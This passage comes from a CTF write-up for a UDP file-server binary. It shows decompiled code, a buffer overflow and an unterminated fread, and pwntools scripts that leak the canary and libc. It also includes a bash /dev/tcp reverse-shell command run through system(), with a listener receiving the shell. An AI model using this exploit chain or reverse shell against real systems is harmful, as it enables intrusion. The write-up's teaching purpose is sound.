</span></span><span style="display:flex;"><span>  v18 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">**</span>)a1;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> a1[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> (read_file <span style="color:#f92672">*</span>)calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x110uLL</span>);
</span></span><span style="display:flex;"><span>      memset(dest, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>      memset(ptr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>      read(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v7], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>      s <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>session;
</span></span><span style="display:flex;"><span>      type <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>type;
</span></span><span style="display:flex;"><span>      size <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>      memcpy(v14, buf<span style="color:#f92672">-&gt;</span>file_name, size);
</span></span><span style="display:flex;"><span>      memcpy(dest, <span style="color:#e6db74">&#34;./files/&#34;</span>, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span><span style="display:flex;"><span>      memcpy(<span style="color:#f92672">&amp;</span>v16, v14, <span style="color:#ae81ff">0xF0uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( strstr(dest, <span style="color:#e6db74">&#34;..&#34;</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;invalid file</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v1);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>type )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>        strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;under construction</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v6);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    stream <span style="color:#f92672">=</span> fopen(dest, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>stream )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    fread(ptr, <span style="color:#ae81ff">0x100uLL</span>, <span style="color:#ae81ff">1uLL</span>, stream);
</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strlen(ptr);
</span></span><span style="display:flex;"><span>    strncpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], ptr, v4);
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>    fclose(stream);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>  strcpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;file can&#39;t be read</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>  send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It&rsquo;s read data from the pipe read of the current session. You may notice that in the main function, it has checked if the first 8 bytes match with the session id, it will perform to write in the pipe_write of this thread. So, I can easily manage communication between them.</p>
<h2 id="read-primitive">Read Primitive</h2>
<pre tabindex="0"><code>╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                         ✔  w1n_gl0ry@phis1Ng ─╮
╰─ ls files                                                                                                                                                        ─╯
dance_of_the_petals  echoes_of_dawn  lullaby_of_the_rain  moonlit_embrace  whispers_of_serenity
</code></pre><p>Basically, the function take the message as the argument to perform read in this file we choose.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">read_file</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> session[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 type;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> file_name[<span style="color:#ae81ff">4082</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Notice that the <code>file_name</code> field we have manage up to 4082 bytes and the <code>size</code> file up to 0xfff bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>memset(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x110uLL</span>);
</span></span><span style="display:flex;"><span>memset(dest, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>memset(ptr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>read(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v7], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>session;
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>type;
</span></span><span style="display:flex;"><span>size <span style="color:#f92672">=</span> buf<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>memcpy(v14, buf<span style="color:#f92672">-&gt;</span>file_name, size);
</span></span><span style="display:flex;"><span>memcpy(dest, <span style="color:#e6db74">&#34;./files/&#34;</span>, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span></code></pre></div><p>However, the <code>v14</code> has only 258 bytes, so we can easily perform overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>fread(ptr, <span style="color:#ae81ff">0x100uLL</span>, <span style="color:#ae81ff">1uLL</span>, stream);
</span></span><span style="display:flex;"><span>memset(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> strlen(ptr);
</span></span><span style="display:flex;"><span>strncpy(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], ptr, v4);
</span></span><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>send_to(v8, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v8[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>fclose(stream);
</span></span></code></pre></div><p>The <code>fread()</code> function does not add a null byte at the end of a string, which means that we can make the <code>v4</code> variable larger than the capacity of the <code>ptr</code> variable. This creates a powerful read primitive that allows for easy setup to leak the canary and libc address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./serendipity_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        brva 0x0000000000002FD7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;157.245.147.89&#39;</span>, <span style="color:#ae81ff">25201</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;udp&#34;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./serendipity_patched&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()                       
</span></span></code></pre></div><p>I use this code to easily debug and connect with a server using <code>nc -u 0 9981</code> on my local machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket 
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;157.245.147.89&#39;, 24210, typ=&#34;udp&#34;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">9981</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;udp&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x301</span>, <span style="color:#ae81ff">0x101</span>, <span style="color:#ae81ff">0x201</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printdata</span>(size, data):
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>data
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>plain<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genarate_rand_string</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, data<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> plain
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        plain<span style="color:#f92672">+=</span>p8(glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)    
</span></span><span style="display:flex;"><span>    print(plain<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">authenticate</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> session
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>plain
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    print(data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>genarate_rand_string()  
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>authenticate()
</span></span><span style="display:flex;"><span>print(a)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>printdata(<span style="color:#ae81ff">0xfff</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xfff</span>)
</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recv())
</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>heap<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">10</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4ba0</span>
</span></span><span style="display:flex;"><span>print(hex(heap))
</span></span></code></pre></div><p>This code attempts to execute a heap leak using <code>opcode 0x301</code>, but unfortunately it fails in the server</p>
<p>We have to leak canary and libc via <code>opcode 0x101</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>))<span style="color:#f92672">*</span>b<span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io.recv()
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>u64(b<span style="color:#e6db74">&#39;\0&#39;</span><span style="color:#f92672">+</span>data[<span style="color:#ae81ff">265</span><span style="color:#f92672">:</span>])
</span></span><span style="display:flex;"><span>log.info(<span style="color:#e6db74">&#34;canary: &#34;</span> <span style="color:#f92672">+</span> hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">&#39;</span>))<span style="color:#f92672">*</span>b<span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>data[<span style="color:#ae81ff">265</span><span style="color:#f92672">:</span>]
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io.recv()
</span></span><span style="display:flex;"><span>libc.address<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">264</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>].ljust(<span style="color:#ae81ff">8</span>, b<span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x94ac3</span>
</span></span><span style="display:flex;"><span>log.info(<span style="color:#e6db74">&#34;libc.address: &#34;</span> <span style="color:#f92672">+</span> hex(libc.address))
</span></span></code></pre></div><p>Here is result:</p>
<pre tabindex="0"><code>╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1 ✘  w1n_gl0ry@phis1Ng ─╮
╰─ python3 remote.py                                                                                                                                               ─╯
[*] &#39;/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0 on port 9981: Done
85026bdce60e5a253187b0a061854c0269225675b70fcadd25c7353058ffb4dd
b&#39;auth successfully\n&#39;
[*] canary: 0x89f7373a66e1cd00
[*] libc.address: 0x7f4413600000
[*] Switching to interactive mode
$  
</code></pre><p>We have successfully leaked. How can we get the shell through the UDP connection?</p>
<p>I use this method to execute a reverse shell:</p>
<ul>
<li>Listen on a port 1337:</li>
</ul>
<pre tabindex="0"><code>╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
╰─ nc -lnvp 1337                                                                                                                                                                     ─╯
Listening on 0.0.0.0 1337
</code></pre><ul>
<li>I use the system function in my ROP to execute a command.</li>
</ul>
<pre tabindex="0"><code>system(&#39;bash -c \&#39;exec bash -i &amp;&gt;/dev/tcp/0/1337 &lt;&amp;1\&#39;&#39;)
</code></pre><p>Result:</p>
<pre tabindex="0"><code>╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                           ✔  w1n_gl0ry@phis1Ng ─╮
╰─ nc -lnvp 1337                                                                                                                                                                     ─╯
Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 34014
w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ 
w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ id
id
uid=1000(w1n_gl0ry) gid=1000(w1n_gl0ry) groups=1000(w1n_gl0ry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
</code></pre><p>We successfully achieved RCE using reverse shell. However, the docker blocked external network access, preventing us from obtaining a shell.</p>
<h2 id="final-phase">final phase</h2>
<p>During the contest, I considered an alternative approach: simply performing an open-read-write to obtain the flag. The author also hinted at the flag&rsquo;s location: /home/user/flag. But can we obtain the flag by writing to stdout?</p>
<p>No, we need to come up with a different approach to send the flag over the UDP connection. So, I will use an open-read-sendto chain to get the flag</p>
<p>So what parameters does the <code>sendto</code> syscall need?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">sendto</span>(<span style="color:#66d9ef">int</span> sockfd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">int</span> flags, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>dest_addr, <span style="color:#66d9ef">socklen_t</span> addrlen);
</span></span></code></pre></div><p>Fortunately, the r8 register points to our sockaddr struct before executing our ROP chain.</p>
<pre tabindex="0"><code> RAX  0x0
 RBX  0x7f744c1fe640 ◂— 0x7f744c1fe640
 RCX  0x7f744cb27c56 (sendto+118) ◂— cmp rax, -0x1000 /* &#39;H=&#39; */
*RDX  0x0
 RDI  0x0
 RSI  0x560df594a3d4 ◂— &#34;file can&#39;t be read\n&#34;
 R8   0x560df594a3c0 ◂— 0x100007fa8d10002  // our sockaddr struct
 R9   0x10
 R10  0x0
 R11  0x293
 R12  0x7f744c1fe640 ◂— 0x7f744c1fe640
 R13  0x0
 R14  0x7f744ca947d0 (start_thread) ◂— endbr64 
 R15  0x7ffed7952e20 ◂— 0x0
 RBP  0x7f744c1fde50 ◂— 0x4141414141414141 (&#39;AAAAAAAA&#39;)
 RSP  0x7f744c1fdaf0 ◂— 0x0
*RIP  0x560df4890e70 ◂— je 0x560df4890e77
*EFLAGS 0x246 [ cf PF af ZF sf IF df of ]
──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
   0x560df4890d19                             call   0x560df48909b9                &lt;0x560df48909b9&gt;
 
   0x560df4890d1e                             mov    eax, 0
   0x560df4890d23                             jmp    0x560df4890e63                &lt;0x560df4890e63&gt;
    ↓
